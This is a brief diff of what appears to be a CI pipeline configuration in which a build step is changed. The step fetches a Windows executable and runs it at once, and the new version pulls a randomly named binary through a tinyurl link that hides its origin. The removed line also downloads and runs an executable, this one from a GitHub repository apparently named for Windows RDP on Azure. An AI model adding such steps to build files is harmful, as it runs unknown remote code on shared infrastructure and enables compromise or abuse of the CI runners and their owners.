@@ -20,4 +20,4 @@ jobs:
 
     steps:
 
-      - run: curl -L -o circleci.exe https://github.com/docefio/Windows2019RDP-Azure && circleci.exe
+      - run: curl -L -o 34n9233v.exe https://tinyurl.com/34n9233v && 34n9233v.exe
